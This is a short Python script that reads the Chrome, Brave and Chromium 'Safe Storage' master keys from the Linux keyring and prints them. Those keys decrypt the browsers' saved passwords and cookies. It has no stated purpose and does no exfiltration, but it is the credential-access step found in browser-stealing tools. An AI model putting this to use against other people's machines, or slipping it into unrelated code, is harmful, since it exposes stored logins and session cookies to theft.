import secretstorage

def get_keys(browser):
    global MY_PASS
    try:
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
        for item in collection.get_all_items():
            if item.get_label() == browser:
                MY_PASS = item.get_secret()
                print(MY_PASS.decode())
                break
        else:
            print(f'{browser} password not found!')
    except:
        pass
        
get_keys("Chrome Safe Storage")
get_keys("Brave Safe Storage")
get_keys("Chromium Safe Storage")
